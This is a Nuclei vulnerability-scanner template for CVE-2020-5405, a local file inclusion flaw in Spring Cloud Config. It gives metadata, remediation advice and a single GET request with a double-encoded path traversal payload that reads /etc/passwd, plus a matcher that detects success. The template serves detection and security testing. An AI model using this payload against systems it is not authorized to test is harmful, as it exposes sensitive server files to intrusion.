id: CVE-2020-5405

info:
  name: Spring Cloud Config - Local File Inclusion
  author: harshbothra_
  severity: medium
  description: Spring Cloud Config versions 2.2.x prior to 2.2.2, 2.1.x prior to 2.1.7, and older unsupported versions are vulnerable to local file inclusion because they allow applications to serve arbitrary configuration files through the spring-cloud-config-server module.
  impact: |
    An attacker can read sensitive files on the server, potentially leading to unauthorized access, data leakage, or further exploitation.
  remediation: |
    Upgrade to a patched version of Spring Cloud Config or apply the recommended security patches to mitigate the vulnerability.
  reference:
    - https://pivotal.io/security/cve-2020-5405
    - https://nvd.nist.gov/vuln/detail/CVE-2020-5405
    - https://github.com/Secxt/FINAL
    - https://github.com/pen4uin/vulnerability-research-list
    - https://github.com/sobinge/nuclei-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
    cvss-score: 6.5
    cve-id: CVE-2020-5405
    cwe-id: CWE-22,CWE-23
    epss-score: 0.69694
    epss-percentile: 0.98614
    cpe: cpe:2.3:a:vmware:spring_cloud_config:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: vmware
    product: spring_cloud_config
  tags: cve2020,cve,lfi,springcloud,vmware

http:
  - method: GET
    path:
      - '{{BaseURL}}/a/b/%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd'

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200
# digest: 490a0046304402202de7c4893d38d5dcc10b171d8e2ab07e96a807a355c64cb082a6911e07a3a50402202643ea9a326b4a573e6f86d871787054933d541f2c50e6285c05e01985cfaa7b:922c64590222798bb761d5b6d8e72950